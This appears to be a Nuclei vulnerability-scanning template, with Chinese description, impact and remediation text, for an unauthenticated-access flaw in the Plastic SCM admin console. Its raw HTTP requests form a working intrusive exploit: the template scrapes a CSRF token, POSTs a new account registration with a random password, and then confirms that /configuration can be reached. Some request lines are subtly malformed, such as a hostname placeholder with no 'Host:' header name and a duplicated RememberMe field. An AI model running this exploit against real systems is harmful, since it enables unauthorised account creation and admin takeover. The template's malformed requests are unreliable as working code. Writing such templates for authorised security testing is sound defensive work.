id: unauthorized-plastic-scm

info:
  name: Plastic SCM 管理控制台认证绕过
  author: DEENA
  severity: critical
  description: |-
    该模板用于核查 Plastic SCM 管理控制台认证绕过。目标管理界面、控制台或敏感接口在未登录状态下可访问，通常源于默认开放、反向代理绕过、初始化流程遗留或访问控制配置错误。模板访问 /account/register、/configuration，并根据页面标题、接口响应、重定向或关键业务字段确认未授权访问。
  reference:
    - https://infosecwriteups.com/story-of-google-hall-of-fame-and-private-program-bounty-worth-53559a95c468
  classification:
    cvss-metrics: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-288
  metadata:
    max-request: 3
  tags: plastic,misconfig,intrusive,vuln
  impact: |-
    - 攻击者可查看或操作管理功能、任务队列、监控数据、配置项、项目数据或设备状态。
    - 若界面提供写入、执行、上传或注册能力，可能进一步造成服务接管、数据泄露或业务中断。
  remediation: |-
    - 为管理入口和 API 强制启用认证授权，关闭匿名访问、访客登录和公开注册。
    - 将控制台限制在内网、VPN 或可信来源，并在网关层增加访问控制。
    - 复核默认配置、反向代理规则和初始化状态，清理测试账户并开启审计日志。
http:
  - raw:
      - |
        GET /account/register HTTP/1.1
        {{Hostname}}
      - |
        POST /account/register HTTP/1.1
        Host: {{Hostname}}
        Origin: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/account/register
        Connection: close

        Password={{randstr}}&ConfirmPassword={{randstr}}&RememberMe=true&__RequestVerificationToken={{csrf}}&RememberMe=false
      - |
        GET /configuration HTTP/1.1
        {{Hostname}}

    extractors:
      - type: regex
        part: body
        internal: true
        group: 1
        name: csrf
        regex:
          - 'RequestVerificationToken" type="hidden" value="([A-Za-z0-9_-]+)" \/>'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<title>Network - Plastic SCM</title>"
        part: body

      - type: status
        status:
          - 200
